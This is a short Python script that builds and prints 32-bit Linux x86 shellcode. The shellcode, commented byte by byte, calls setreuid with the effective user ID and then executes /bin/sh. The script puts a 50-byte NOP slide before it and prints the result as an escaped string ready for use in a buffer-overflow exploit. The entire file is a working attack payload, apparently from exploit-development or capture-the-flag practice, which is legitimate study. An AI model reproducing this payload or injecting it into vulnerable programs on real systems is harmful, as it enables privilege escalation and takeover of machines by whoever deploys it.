NOP_SLIDE = 50

# Shellcode in Python
shellcode = (
    b"\x6a\x31"  # push 0x31 (49)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80 (geteuid())

    b"\x89\xc3"  # mov ebx, eax (uid)
    b"\x89\xd9"  # mov ecx, ebx
    b"\x6a\x46"  # push 0x46 (70)
    b"\x58"      # pop eax
    b"\xcd\x80"  # int 0x80, setreuid(geteuid(), geteuid())

    b"\x99"      # cdq (now edx contains 0)
    b"\x52"      # push edx, which is \0
    b"\x68\x2f\x2f\x73\x68"  # push "//sh"
    b"\x68\x2f\x62\x69\x6e"  # push "/bin"
    b"\x89\xe3"  # mov ebx, esp (now ebx contains: "/bin//sh",\x00)

    b"\x52"      # push edx (push NULL into stack)
    b"\x53"      # push ebx (push pathname)
    b"\x89\xe1"  # mov ecx, esp (ecx is argv)

    b"\xb0\x0b"  # mov al, 0x0b (11)
    b"\xcd\x80"  # int 0x80 (execv("/bin//sh", argv))
)

# Print shellcode details
print("Shellcode code is:")
print("setreuid(geteuid(), geteuid())")
print("execv(\"/bin//sh\", argv)")

# Print shellcode with NOP slide
print("\nShellcode as formatted string:")

# Add NOP slide (\x90) before shellcode
nop_slide = b"\x90" * NOP_SLIDE
formatted_shellcode = nop_slide + shellcode

# Convert to formatted string
print("".join(f"\\x{byte:02x}" for byte in formatted_shellcode))

# Calculate shellcode length
print(f"\nLength of shellcode is {len(formatted_shellcode)} bytes")
